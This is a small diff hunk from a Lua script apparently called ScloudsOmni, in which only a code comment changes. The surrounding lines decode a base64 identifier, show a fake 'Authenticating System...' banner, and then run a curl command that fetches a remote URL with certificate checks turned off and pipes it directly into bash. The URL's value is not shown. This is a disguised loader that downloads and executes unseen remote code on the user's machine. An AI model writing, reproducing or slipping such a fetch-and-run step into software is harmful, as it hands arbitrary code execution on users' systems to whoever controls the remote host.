@@ -22,7 +22,7 @@ local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")
 os.execute("clear")
 print("\27[1;36m[ScloudsOmni]\27[0m Authenticating System...")
 
-- Execute
+-- Execute The Bash
 local cmd = "curl -sL -k -A '" .. ident .. "' '" .. target .. "' | bash"
 
 local status = os.execute(cmd)
